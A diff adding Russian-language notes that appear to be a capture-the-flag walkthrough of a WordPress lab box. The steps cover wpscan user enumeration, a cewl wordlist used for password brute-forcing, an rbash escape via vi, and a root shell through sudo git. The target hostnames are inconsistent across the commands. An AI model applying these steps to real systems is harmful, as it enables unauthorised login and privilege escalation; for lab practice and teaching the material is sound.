@@ -1,0 +1,32 @@
+машина работает под cms wordpress
+wpscan --url http://symfonos.localdomain/h3l105/ --enumerate u
+    admin
+    tom
+    jerry
+
+wpscan --url http://dc-2 --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive
+    ничего не находим
+
+при осмотре вебстраницы обнаруживаюм страницу flag.html, в ней содержится подсказка что нужно воспользоваться cewl
+    cewl -m 5 http://192.168.226.168 > dic2.txt
+
+wpscan --url http://derpnstink.local/weblog -U user.txt -P dic2.txt
+    jerry / adipiscing
+    tom / parturient
+
+подключимся к tom ssh
+встречает нас уже запомнившийся нелюбимый rbash
+    vi
+        :set shell=/bin/sh
+        :shell
+
+    export PATH=$PATH:/usr/local/bin:/usr/bin:/bin
+
+становимся jerry, потому что тому не доступно выполнение от имени рута
+    su jerry
+    password:adipiscing
+
+    можно повысить привеллегии с помощью git
+        sudo git -p help config
+            !/bin/sh
+           
